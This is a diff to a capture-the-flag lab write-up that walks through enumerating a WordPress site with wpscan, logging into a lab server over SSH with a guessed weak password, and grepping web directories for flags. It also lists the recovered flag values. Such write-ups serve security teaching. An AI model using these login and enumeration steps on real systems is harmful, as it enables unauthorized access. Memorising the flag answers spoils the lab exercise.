@@ -37,29 +37,30 @@ wpscan –url http://192.168.1.110/wordpress
 ~~~
 [picture]
 
--- We then found two login names: Steven and Michael  
+We then found two login names: Steven and Michael  
 [picture]  
-- By sheer luck, we guessed the password without brute force:  
+By sheer luck, we guessed the password without brute force:  
+~~~
 - ssh michael@192.168.1.110
 - Password:  michael
--  Commands:
-~~~
 cd ../../var/www/html
 grep -RE flag1
 ~~~
 
 **flag2{fc3fd58dcdad9ab23faca6e9a36e581c}**
-- Follow same steps as flag 1
+- Follow same steps as flag 1 to ssh into the server
 ~~~ 
 cd ../../var/www/
 grep -RE flag2
 ~~~
 
 
-Flag 3,4 from MySQL:
+**flag3{afc01ab56b50591e7dccf93122770cd2}**
+**flag4{715dea6c055b9fe3337544932f2941ce}**
 Tools used: SSH, MySQL
+~~~
 ssh michael@192.168.1.110
 Password: michael
 cd /var/www/html/wordpress
-
+~~~
 
